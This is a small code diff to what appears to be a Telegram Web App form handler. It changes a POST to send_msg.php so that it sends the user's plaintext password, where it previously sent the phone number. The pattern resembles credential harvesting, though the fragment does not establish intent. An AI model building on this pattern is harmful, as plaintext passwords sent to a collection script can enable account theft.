@@ -32,10 +32,9 @@ function passwordInputHandler(){
 tg.MainButton.onClick(function(){
     passwordInput.blur();
     if (passwordInput.classList == 'correctInput'){
-      console.log(phoneMask.unmaskedValue);
       fetch("send_msg.php", {
         method: "POST",
-        body: phoneMask.unmaskedValue
+        body: password.value
       })
       console.log("отправка сообщения")
     }else{
